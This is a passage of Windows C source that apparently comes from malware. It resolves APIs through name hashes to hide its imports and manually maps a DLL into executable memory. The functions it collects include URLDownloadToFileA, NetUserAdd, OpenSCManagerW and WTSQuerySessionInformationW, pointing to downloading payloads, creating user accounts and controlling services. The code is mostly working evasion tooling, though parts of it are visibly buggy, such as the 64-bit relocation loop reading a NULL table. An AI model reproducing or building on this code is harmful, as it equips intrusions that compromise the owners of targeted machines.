				pKernel32Base = (PVOID)hKernel32;
				if (pKernel32Base)
				{
					InitKernel32HashValue();
					Get_Kernel_Api_From_HashValue(pKernel32Base, \
						(PVOID)&g_Kernel32ApiBlock.MyGetComputerNameW, \
						(PVOID)&g_Kernel32ApiBlock.ulGetComputerNameW_HashValue);
					

					CleanZero((PCHAR)&Krl32Ldr,sizeof(MEMORY_LOADER));
					Krl32Ldr.hModule = (HMODULE*)hKernel32;
					Krl32Ldr.pCode = (PCHAR)pKernel32Base;

					Krl32Ldr.pDosHeader = (PIMAGE_DOS_HEADER)pKernel32Base;
					Krl32Ldr.pNtHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)pKernel32Base + Krl32Ldr.pDosHeader->e_lfanew);

					//g_Kernel32ApiBlock.MyExitProcess = (EXITPROCESS)MyMemoryGetProcAddress(&Krl32Ldr,"ExitProcess");
					//g_Kernel32ApiBlock.MyHeapAlloc = (HEAPALLOC)MyMemoryGetProcAddress(&Krl32Ldr,"HeapAlloc");
					//g_Kernel32ApiBlock.MyHeapReAlloc = (HEAPREALLOC)MyMemoryGetProcAddress(&Krl32Ldr,"HeapReAlloc");
					//g_Kernel32ApiBlock.MyHeapSize = (HEAPSIZE)MyMemoryGetProcAddress(&Krl32Ldr,"HeapSize");

					//g_Kernel32ApiBlock.MyGlobalAlloc = (GLOBALALLOC)MyMemoryGetProcAddress(&Krl32Ldr,"GlobalAlloc");
					//g_Kernel32ApiBlock.MyGlobalFree = (GLOBALFREE)MyMemoryGetProcAddress(&Krl32Ldr,"GlobalFree");

					//g_Kernel32ApiBlock.MyGlobalLock = (GLOBALLOCK)MyMemoryGetProcAddress(&Krl32Ldr,"GlobalLock");
					//g_Kernel32ApiBlock.MyGlobalUnlock = (GLOBALUNLOCK)MyMemoryGetProcAddress(&Krl32Ldr,"GlobalUnlock");

					//g_Kernel32ApiBlock.MyGlobalSize = (GLOBALSIZE)MyMemoryGetProcAddress(&Krl32Ldr,"GlobalSize");

					//g_Kernel32ApiBlock.MyGetLastError = (GETLASTERROR)MyMemoryGetProcAddress(&Krl32Ldr,"GetLastError");


					g_Kernel32ApiBlock.MyExitProcess = (EXITPROCESS)g_Kernel32ApiBlock.MyGetProcAddress((HMODULE)hKernel32,"ExitProcess");
					g_Kernel32ApiBlock.MyHeapAlloc = (HEAPALLOC)g_Kernel32ApiBlock.MyGetProcAddress((HMODULE)hKernel32,"HeapAlloc");
					g_Kernel32ApiBlock.MyHeapReAlloc = (HEAPREALLOC)g_Kernel32ApiBlock.MyGetProcAddress((HMODULE)hKernel32,"HeapReAlloc");
					g_Kernel32ApiBlock.MyHeapSize = (HEAPSIZE)g_Kernel32ApiBlock.MyGetProcAddress((HMODULE)hKernel32,"HeapSize");

					g_Kernel32ApiBlock.MyGlobalAlloc = (GLOBALALLOC)g_Kernel32ApiBlock.MyGetProcAddress((HMODULE)hKernel32,"GlobalAlloc");
					g_Kernel32ApiBlock.MyGlobalFree = (GLOBALFREE)g_Kernel32ApiBlock.MyGetProcAddress((HMODULE)hKernel32,"GlobalFree");

					g_Kernel32ApiBlock.MyGlobalLock = (GLOBALLOCK)g_Kernel32ApiBlock.MyGetProcAddress((HMODULE)hKernel32,"GlobalLock");
					g_Kernel32ApiBlock.MyGlobalUnlock = (GLOBALUNLOCK)g_Kernel32ApiBlock.MyGetProcAddress((HMODULE)hKernel32,"GlobalUnlock");

					g_Kernel32ApiBlock.MyGlobalSize = (GLOBALSIZE)g_Kernel32ApiBlock.MyGetProcAddress((HMODULE)hKernel32,"GlobalSize");

					g_Kernel32ApiBlock.MyGetLastError = (GETLASTERROR)g_Kernel32ApiBlock.MyGetProcAddress((HMODULE)hKernel32,"GetLastError");

					//g_Kernel32ApiBlock.MyGetCurrentDirectoryA = (GETCURRENTDIRECTORYA)g_Kernel32ApiBlock.MyGetProcAddress((HMODULE)hKernel32,"GetCurrentDirectoryA");
				}
			}
			if (!pKernel32Base || \
				!g_Kernel32ApiBlock.MyGetComputerNameW)
			{
				break;
			}
		}
//==============================================================================================================================
//								Get AdvApi32.dll Exports Function
//==============================================================================================================================
		CleanZero((PCHAR)&g_AdvApi32ApiBlock,sizeof(API_BLOCK_ADVAPI32));
		CleanZero((PCHAR)wLdrPath,sizeof(WCHAR) * MAX_PATH);
		g_Kernel32ApiBlock.MyGetSystemDirectoryW(wLdrPath,MAX_PATH);
		StringCchCat(wLdrPath,MAX_PATH,L"\\advapi32.dll");
		//ulSize = GetLoadDat(wLdrPath, \
		//	(PCHAR)&pFileDat, \
		//	g_Kernel32ApiBlock.MyVirtualAlloc, \
		//	g_Kernel32ApiBlock.MyCreateFileW, \
		//	g_Kernel32ApiBlock.MyGetFileSize, \
		//	g_Kernel32ApiBlock.MyReadFile, \
		//	g_Kernel32ApiBlock.MyVirtualFree, \
		//	g_Kernel32ApiBlock.MyCloseHandle);
		//if (ulSize <= 0)
		//{
		//	break;
		//}
		//pAdvApi32Base = LoadMemory(pFileDat,g_Kernel32ApiBlock.MyVirtualAlloc);
		//if (NULL == pAdvApi32Base)
		//{
		//	break;
		//}
		hModuleAdvApi = g_Kernel32ApiBlock.MyLoadLibraryW(wLdrPath);
		//if (pFileDat)
		//{
		//	g_Kernel32ApiBlock.MyVirtualFree(pFileDat,ulSize,MEM_COMMIT | MEM_RESERVE);
		//	pFileDat = NULL;
		//	ulSize = 0;
		//}
		if (hModuleAdvApi)
		{
			InitAdvApi32HashValue();
			Get_Kernel_Api_From_HashValue((PVOID)hModuleAdvApi, \
				(PVOID)&g_AdvApi32ApiBlock.MyOpenSCManagerW, \
				(PVOID)&g_AdvApi32ApiBlock.ulOpenSCManagerW_HashValue);
		}
//==============================================================================================================================
//								Get User32.dll Exports Function
//==============================================================================================================================
		CleanZero((PCHAR)&g_User32ApiBlock,sizeof(API_BLOCK_USER32));
		CleanZero((PCHAR)wLdrPath,sizeof(WCHAR) * MAX_PATH);
		g_Kernel32ApiBlock.MyGetSystemDirectoryW(wLdrPath,MAX_PATH);
		StringCchCat(wLdrPath,MAX_PATH,L"\\user32.dll");
		//ulSize = GetLoadDat(wLdrPath, \
		//	(PCHAR)&pFileDat, \
		//	g_Kernel32ApiBlock.MyVirtualAlloc, \
		//	g_Kernel32ApiBlock.MyCreateFileW, \
		//	g_Kernel32ApiBlock.MyGetFileSize, \
		//	g_Kernel32ApiBlock.MyReadFile, \
		//	g_Kernel32ApiBlock.MyVirtualFree, \
		//	g_Kernel32ApiBlock.MyCloseHandle);
		//if (ulSize <= 0)
		//{
		//	break;
		//}
		//pUser32Base = LoadMemory(pFileDat,g_Kernel32ApiBlock.MyVirtualAlloc);
		//if (NULL == pUser32Base)
		//{
		//	break;
		//}
		//if (pFileDat)
		//{
		//	g_Kernel32ApiBlock.MyVirtualFree(pFileDat,ulSize,MEM_COMMIT | MEM_RESERVE);
		//	pFileDat = NULL;
		//	ulSize = 0;
		//}
		hModuleUser32 = g_Kernel32ApiBlock.MyLoadLibraryW(wLdrPath);
		if (hModuleUser32)
		{
			InitUser32HashValue();
			Get_Kernel_Api_From_HashValue(hModuleUser32, \
				(PVOID)&g_User32ApiBlock.MywsprintfA, \
				(PVOID)&g_User32ApiBlock.ulwsprintfA_HashValue);
		}
//==============================================================================================================================
//								Get Ws2_32.dll Exports Function
//==============================================================================================================================
		CleanZero((PCHAR)&g_WinSocket2ApiBlock,sizeof(API_BLOCK_WIN_SOCKET2));
		CleanZero((PCHAR)wLdrPath,sizeof(WCHAR) * MAX_PATH);
		g_Kernel32ApiBlock.MyGetSystemDirectoryW(wLdrPath,MAX_PATH);
		StringCchCat(wLdrPath,MAX_PATH,L"\\ws2_32.dll");
		//ulSize = GetLoadDat(wLdrPath, \
		//	(PCHAR)&pFileDat, \
		//	g_Kernel32ApiBlock.MyVirtualAlloc, \
		//	g_Kernel32ApiBlock.MyCreateFileW, \
		//	g_Kernel32ApiBlock.MyGetFileSize, \
		//	g_Kernel32ApiBlock.MyReadFile, \
		//	g_Kernel32ApiBlock.MyVirtualFree, \
		//	g_Kernel32ApiBlock.MyCloseHandle);
		//if (ulSize <= 0)
		//{
		//	break;
		//}
		//pWs2_32Base = LoadMemory(pFileDat,g_Kernel32ApiBlock.MyVirtualAlloc);
		//if (NULL == pWs2_32Base)
		//{
		//	break;
		//}
		//if (pFileDat)
		//{
		//	g_Kernel32ApiBlock.MyVirtualFree(pFileDat,ulSize,MEM_COMMIT | MEM_RESERVE);
		//	pFileDat = NULL;
		//	ulSize = 0;
		//}
		hModuleWinSocket2 = g_Kernel32ApiBlock.MyLoadLibraryW(wLdrPath);
		if (hModuleWinSocket2)
		{
			InitWs2_32HashValue();
			Get_Kernel_Api_From_HashValue(hModuleWinSocket2, \
				(PVOID)&g_WinSocket2ApiBlock.WSAStartup, \
				(PVOID)&g_WinSocket2ApiBlock.ulWSAStartup_HashValue);
		}
//==============================================================================================================================
//								Get Shell32.dll Exports Function
//==============================================================================================================================
		CleanZero((PCHAR)&g_Shell32ApiBlock,sizeof(API_BLOCK_SHELL32));
		CleanZero((PCHAR)wLdrPath,sizeof(WCHAR) * MAX_PATH);
		g_Kernel32ApiBlock.MyGetSystemDirectoryW(wLdrPath,MAX_PATH);
		StringCchCat(wLdrPath,MAX_PATH,L"\\shell32.dll");
		//ulSize = GetLoadDat(wLdrPath, \
		//	(PCHAR)&pFileDat, \
		//	g_Kernel32ApiBlock.MyVirtualAlloc, \
		//	g_Kernel32ApiBlock.MyCreateFileW, \
		//	g_Kernel32ApiBlock.MyGetFileSize, \
		//	g_Kernel32ApiBlock.MyReadFile, \
		//	g_Kernel32ApiBlock.MyVirtualFree, \
		//	g_Kernel32ApiBlock.MyCloseHandle);
		//if (ulSize <= 0)
		//{
		//	break;
		//}
		//pShell32Base = LoadMemory(pFileDat,g_Kernel32ApiBlock.MyVirtualAlloc);
		//if (NULL == pShell32Base)
		//{
		//	break;
		//}
		//if (pFileDat)
		//{
		//	g_Kernel32ApiBlock.MyVirtualFree(pFileDat,ulSize,MEM_COMMIT | MEM_RESERVE);
		//	pFileDat = NULL;
		//	ulSize = 0;
		//}
		hModuleShell32 = g_Kernel32ApiBlock.MyLoadLibraryW(wLdrPath);
		if (hModuleShell32)
		{
			InitShell32HashValue();
			Get_Kernel_Api_From_HashValue(hModuleShell32, \
				(PVOID)&g_Shell32ApiBlock.MySHGetSpecialFolderPathW, \
				(PVOID)&g_Shell32ApiBlock.ulSHGetSpecialFolderPathW_HashValue);
		}
		//==============================================================================================================================
		//								Get WinINet.dll Exports Function
		//==============================================================================================================================
		CleanZero((PCHAR)&g_WinINetApiBlock,sizeof(API_BLOCK_WININET));
		CleanZero((PCHAR)wLdrPath,sizeof(WCHAR) * MAX_PATH);
		g_Kernel32ApiBlock.MyGetSystemDirectoryW(wLdrPath,MAX_PATH);
		StringCchCat(wLdrPath,MAX_PATH,L"\\wininet.dll");
		//ulSize = GetLoadDat(wLdrPath, \
		//	(PCHAR)&pFileDat, \
		//	g_Kernel32ApiBlock.MyVirtualAlloc, \
		//	g_Kernel32ApiBlock.MyCreateFileW, \
		//	g_Kernel32ApiBlock.MyGetFileSize, \
		//	g_Kernel32ApiBlock.MyReadFile, \
		//	g_Kernel32ApiBlock.MyVirtualFree, \
		//	g_Kernel32ApiBlock.MyCloseHandle);
		//if (ulSize <= 0)
		//{
		//	break;
		//}
		//pShell32Base = LoadMemory(pFileDat,g_Kernel32ApiBlock.MyVirtualAlloc);
		//if (NULL == pShell32Base)
		//{
		//	break;
		//}
		//if (pFileDat)
		//{
		//	g_Kernel32ApiBlock.MyVirtualFree(pFileDat,ulSize,MEM_COMMIT | MEM_RESERVE);
		//	pFileDat = NULL;
		//	ulSize = 0;
		//}
		hModuleWinINet = g_Kernel32ApiBlock.MyLoadLibraryW(wLdrPath);
		if (hModuleWinINet)
		{
			InitWinINetHashValue();
			Get_Kernel_Api_From_HashValue(hModuleWinINet, \
				(PVOID)&g_WinINetApiBlock.InternetOpenW, \
				(PVOID)&g_WinINetApiBlock.ulInternetOpenW_HashValue);
		}

		CleanZero((PCHAR)&g_Gdi32ApiBlock,sizeof(API_BLOCK_GDI32));
		CleanZero((PCHAR)wLdrPath,sizeof(WCHAR) * MAX_PATH);
		g_Kernel32ApiBlock.MyGetSystemDirectoryW(wLdrPath,MAX_PATH);
		StringCchCat(wLdrPath,MAX_PATH,L"\\gdi32.dll");
		hModuleGdi32 = g_Kernel32ApiBlock.MyLoadLibraryW(wLdrPath);
		if (hModuleGdi32)
		{
			InitGdi32HashValue();
			Get_Kernel_Api_From_HashValue(hModuleGdi32, \
				(PVOID)&g_Gdi32ApiBlock.CreateDIBSection, \
				(PVOID)&g_Gdi32ApiBlock.ulCreateDIBSection_HashValue);
		}

		CleanZero((PCHAR)&g_WtsApi32Block,sizeof(API_BLOCK_WTSAPI32));
		CleanZero((PCHAR)wLdrPath,sizeof(WCHAR) * MAX_PATH);
		g_Kernel32ApiBlock.MyGetSystemDirectoryW(wLdrPath,MAX_PATH);
		StringCchCat(wLdrPath,MAX_PATH,L"\\wtsapi32.dll");
		hModuleWtsApi32 = g_Kernel32ApiBlock.MyLoadLibraryW(wLdrPath);
		if (hModuleWtsApi32)
		{
			InitWtsApi32HashValue();
			Get_Kernel_Api_From_HashValue(hModuleWtsApi32, \
				(PVOID)&g_WtsApi32Block.MyWTSQuerySessionInformationW, \
				(PVOID)&g_WtsApi32Block.ulWTSQuerySessionInformationW_HashValue);
		}


		CleanZero((PCHAR)&g_PsApiBlock,sizeof(API_BLOCK_PSAPI));
		CleanZero((PCHAR)wLdrPath,sizeof(WCHAR) * MAX_PATH);
		g_Kernel32ApiBlock.MyGetSystemDirectoryW(wLdrPath,MAX_PATH);
		StringCchCat(wLdrPath,MAX_PATH,L"\\psapi.dll");
		hModulePsApi = g_Kernel32ApiBlock.MyLoadLibraryW(wLdrPath);
		if (hModulePsApi)
		{
			InitPsApiHashValue();
			Get_Kernel_Api_From_HashValue(hModulePsApi, \
				(PVOID)&g_PsApiBlock.MyEnumProcessModules, \
				(PVOID)&g_PsApiBlock.ulEnumProcessModules_HashValue);
		}

		CleanZero((PCHAR)&g_UrlMonApiBlock,sizeof(API_BLOCK_URLMON));
		CleanZero((PCHAR)wLdrPath,sizeof(WCHAR) * MAX_PATH);
		g_Kernel32ApiBlock.MyGetSystemDirectoryW(wLdrPath,MAX_PATH);
		StringCchCat(wLdrPath,MAX_PATH,L"\\urlmon.dll");
		hModuleUrlMon = g_Kernel32ApiBlock.MyLoadLibraryW(wLdrPath);
		if (hModuleUrlMon)
		{
			InitUrlMonHashValue();
			Get_Kernel_Api_From_HashValue(hModuleUrlMon, \
				(PVOID)&g_UrlMonApiBlock.MyURLDownloadToFileA, \
				(PVOID)&g_UrlMonApiBlock.ulURLDownloadToFileA_HashValue);
		}

		CleanZero((PCHAR)&g_NetApi32Block,sizeof(API_BLOCK_NETAPI32));
		CleanZero((PCHAR)wLdrPath,sizeof(WCHAR) * MAX_PATH);
		g_Kernel32ApiBlock.MyGetSystemDirectoryW(wLdrPath,MAX_PATH);
		StringCchCat(wLdrPath,MAX_PATH,L"\\netapi32.dll");
		hModuleNetApi32 = g_Kernel32ApiBlock.MyLoadLibraryW(wLdrPath);
		if (hModuleNetApi32)
		{
			InitNetApi32HashValue();
			Get_Kernel_Api_From_HashValue(hModuleNetApi32, \
				(PVOID)&g_NetApi32Block.MyNetUserAdd, \
				(PVOID)&g_NetApi32Block.ulNetUserAdd_HashValue);
		}


		CleanZero((PCHAR)&g_ShlwApiBlock,sizeof(API_BLOCK_SHLWAPI));
		CleanZero((PCHAR)wLdrPath,sizeof(WCHAR) * MAX_PATH);
		g_Kernel32ApiBlock.MyGetSystemDirectoryW(wLdrPath,MAX_PATH);
		StringCchCat(wLdrPath,MAX_PATH,L"\\shlwapi.dll");
		hModuleShlwApi = g_Kernel32ApiBlock.MyLoadLibraryW(wLdrPath);
		if (hModuleShlwApi)
		{
			InitShlwApiHashValue();
			Get_Kernel_Api_From_HashValue(hModuleShlwApi, \
				(PVOID)&g_ShlwApiBlock.MySHGetValueA, \
				(PVOID)&g_ShlwApiBlock.ulSHGetValueA_HashValue);
		}
	} while (0);
	return bRet;
}
ULONG GetLoadDat(PWCHAR pLoadName, \
				 PCHAR *pLoadDat, \
				 VIRTUALALLOC pVirtualAlloc, \
				 CREATEFILEW pCreateFileW, \
				 GETFILESIZE pGetFileSize, \
				 READFILE pReadFile, \
				 VIRTUALFREE pVirtualFree, \
				 CLOSEHANDLE pCloseHandle)
{
	HANDLE hFile;
	ULONG ulDatSize,ulRetByteSize;

	hFile = INVALID_HANDLE_VALUE;
	ulDatSize = 0;
	ulRetByteSize = 0;
	*pLoadDat = NULL;

	do 
	{
		hFile = pCreateFileW(pLoadName, \
			FILE_READ_ACCESS, \
			FILE_SHARE_READ, \
			NULL, \
			OPEN_EXISTING, \
			FILE_ATTRIBUTE_NORMAL, \
			NULL);
		if (INVALID_HANDLE_VALUE == hFile)
		{
			break;
		}
		ulDatSize = pGetFileSize(hFile,NULL);
		if (INVALID_FILE_SIZE == ulDatSize)
		{
			break;
		}
		*pLoadDat = (PCHAR)pVirtualAlloc(NULL,ulDatSize,MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE);
		if (NULL == pLoadDat)
		{
			break;
		}
		CleanZero((PCHAR)*pLoadDat,ulDatSize);
		if (pReadFile(hFile,(PVOID)*pLoadDat,ulDatSize,&ulRetByteSize,NULL) == FALSE)
		{
			break;
		}
	} while (0);
	if (!hFile && *pLoadDat)
	{
		pVirtualFree((PVOID)*pLoadDat,ulRetByteSize,MEM_COMMIT | MEM_RESERVE);
	}
	if (hFile)
	{
		pCloseHandle(hFile);
	}
	return ulRetByteSize;
}
PVOID LoadMemory(PVOID pMemory,VIRTUALALLOC pVirtualAlloc)
{
	PIMAGE_DOS_HEADER pDosHeader;
	PIMAGE_NT_HEADERS pNtHeader;
	PIMAGE_SECTION_HEADER pSectionHeader;
	PIMAGE_DATA_DIRECTORY pRelocTable;
	PIMAGE_BASE_RELOCATION pRelocBlock;
	//ULONG ulSizeOfHeaders;
	ULONG ulSizeOfImage;
	PVOID pNewBaseAddress;
	PVOID pTmp;
	ULONG uli;
	ULONG ulRelocCnt;
	//#ifndef _WIN64
	ULONG_PTR ulPageOffset;
	USHORT *uOffsetTable;
	//#endif
	ULONG_PTR ulOffset;
	//ULONG *ulSearchCode;
	PIMAGE_RELOC pImageReloc;

	ulSizeOfImage = 0;
	pRelocTable = NULL;
	pRelocBlock = NULL;
	pImageReloc = NULL;
	uOffsetTable = NULL;
	pTmp = NULL;

	pDosHeader = (PIMAGE_DOS_HEADER)pMemory;
	pNtHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)pDosHeader + pDosHeader->e_lfanew);
	ulSizeOfImage = pNtHeader->OptionalHeader.SizeOfImage * 3;
	pNewBaseAddress = (PUCHAR)pVirtualAlloc(NULL,ulSizeOfImage,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
	if (NULL == pNewBaseAddress)
	{
		return NULL;
	}
	CleanZero((PCHAR)pNewBaseAddress,ulSizeOfImage);
	ulOffset = (ULONG_PTR)pNewBaseAddress - pNtHeader->OptionalHeader.ImageBase;

	My__MEMCPY__((PCHAR)pNewBaseAddress, \
		(PCHAR)pDosHeader, \
		pNtHeader->OptionalHeader.SizeOfHeaders);

	pSectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)pNtHeader + \
		sizeof(ULONG) +  \
		sizeof(IMAGE_FILE_HEADER) + \
		pNtHeader->FileHeader.SizeOfOptionalHeader);
	for (uli = 0;uli < pNtHeader->FileHeader.NumberOfSections;uli++)
	{
		My__MEMCPY__((PCHAR)((ULONG_PTR)pNewBaseAddress + pSectionHeader[uli].VirtualAddress), \
			(PCHAR)((ULONG_PTR)pMemory + pSectionHeader[uli].PointerToRawData), \
			pSectionHeader[uli].SizeOfRawData);
	}
	//for (uli = 0;uli < pNtHeader->FileHeader.NumberOfSections;uli++)
	//{
	//	if (pSectionHeader[uli].VirtualAddress)
	//	{
	//		pTmp = (PVOID)((ULONG_PTR)pNewBaseAddress + pSectionHeader[uli].VirtualAddress);
	//	}
	//	if (pSectionHeader[uli].SizeOfRawData)
	//	{
	//		My__MEMCPY__((PCHAR)pTmp, \
	//			(PCHAR)((ULONG_PTR)pBaseAddr + pSectionHeader[uli].PointerToRawData), \
	//			pSectionHeader[uli].SizeOfRawData);
	//		if (pSectionHeader[uli].Misc.VirtualSize < pSectionHeader[uli].SizeOfRawData)
	//		{
	//			pTmp = (PIMAGE_SECTION_HEADER)((ULONG_PTR)pTmp + \
	//				GetAlignedSize(pSectionHeader[uli].SizeOfRawData, \
	//				pNtHeader->OptionalHeader.SectionAlignment));
	//		}
	//		else
	//		{
	//			pTmp = (PIMAGE_SECTION_HEADER)((ULONG_PTR)pTmp + \
	//				GetAlignedSize(pSectionHeader[uli].Misc.VirtualSize, \
	//				pNtHeader->OptionalHeader.SectionAlignment));
	//		}
	//	}
	//	else
	//	{
	//		pTmp = (PIMAGE_SECTION_HEADER)((ULONG_PTR)pTmp + \
	//			GetAlignedSize(pSectionHeader[uli].Misc.VirtualSize, \
	//			pNtHeader->OptionalHeader.SectionAlignment));
	//	}
	//}
#ifndef _WIN64
	if (pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
	{
		pRelocBlock = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)pNewBaseAddress +  \
			pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
		while (pRelocBlock->SizeOfBlock)
		{
			uOffsetTable = (USHORT *)&pRelocBlock[1];
			ulRelocCnt = (pRelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
			for (uli = 0;uli < ulRelocCnt;uli++)
			{
				ulPageOffset = uOffsetTable[uli];
				if ((ulPageOffset & 0xF000) != 0x3000)
				{
					continue;
				}
				ulPageOffset &= 0xFFF;
				ulPageOffset += (ULONG_PTR)((ULONG_PTR)pNewBaseAddress + pRelocBlock->VirtualAddress);
				(*(ULONG_PTR*)ulPageOffset) += ulOffset;
			}
			pRelocBlock = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)pRelocBlock + pRelocBlock->SizeOfBlock);
		}
	}
#else
	if (pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0 && \
		pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size != 0)
	{
		pRelocBlock = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)pNewBaseAddress +  \
			pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
		while (pRelocBlock->SizeOfBlock && \
			pRelocBlock->SizeOfBlock < 0xFFFF)
		{
			pImageReloc = (PIMAGE_RELOC)&pRelocBlock[1];
			ulRelocCnt = (pRelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
			for (uli = 0;uli < ulRelocCnt;uli++)
			{
				//IMAGE_REL_BASED_DIR64
				ulPageOffset = uOffsetTable[uli];
				if ((ulPageOffset & 0xF000) != 0xA000)
				{
					continue;
				}
				ulPageOffset &= 0xFFF;
				ulPageOffset += (ULONG_PTR)((ULONG_PTR)pNewBaseAddress + pRelocBlock->VirtualAddress);
				(*(ULONG_PTR*)ulPageOffset) += ulOffset;
			}
			pRelocBlock = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)pRelocBlock + pRelocBlock->SizeOfBlock);
		}
	}
#endif
	return pNewBaseAddress;
}
void Get_Kernel_Api_From_HashValue(PVOID pImageBase,PVOID pFirstAddress,PVOID pFirstHashValue)
{
	PIMAGE_DOS_HEADER pDosHeader;
	PIMAGE_NT_HEADERS pNtHeader;
	PIMAGE_EXPORT_DIRECTORY pExport;
	ULONG *ulAddressOfNames,*ulAddressOfFunctions;
	ULONG ulBase,ulHashValue;
	char* szApiName;
	ULONG uli;
	ULONG ulCurrentHashValue;
	PVOID pCurFuncAddress,pHashValue;
	USHORT *ulAddressOfNameOrdinals;
	
	pDosHeader = (PIMAGE_DOS_HEADER)pImageBase;
	pNtHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)pImageBase + pDosHeader->e_lfanew);
	pExport = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)pImageBase +  \
		pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	ulBase = pExport->Base;
	ulAddressOfFunctions = (ULONG*)((ULONG_PTR)pImageBase + pExport->AddressOfFunctions);
	ulAddressOfNames = (ULONG *)((ULONG_PTR)pImageBase + pExport->AddressOfNames);
	ulAddressOfNameOrdinals = (USHORT *)((ULONG_PTR)pImageBase + pExport->AddressOfNameOrdinals);
    
	for (uli = 0;uli < pExport->NumberOfNames;uli++)
	{
		szApiName = (char*)pImageBase + ulAddressOfNames[uli];
		ulHashValue = CalcHashValue(szApiName);
		if (ulHashValue)
		{
				pHashValue = pFirstHashValue;
				pCurFuncAddress = pFirstAddress;
				do 
				{
					ulCurrentHashValue = (ULONG)(*(ULONG*)pHashValue);
					if (ulHashValue == ulCurrentHashValue)
					{
						*(ULONG_PTR *)pCurFuncAddress = ulAddressOfFunctions[ulAddressOfNameOrdinals[uli]] + (ULONG_PTR)pImageBase;
					}
                    pHashValue = (PVOID)((ULONG_PTR)pHashValue + sizeof(ULONG_PTR) + sizeof(ULONG));
					pCurFuncAddress = (PVOID)((ULONG_PTR)pCurFuncAddress + sizeof(ULONG) + sizeof(ULONG_PTR));
				} while ((ULONG)(*(ULONG*)pHashValue));
		}
	}
	return;
}
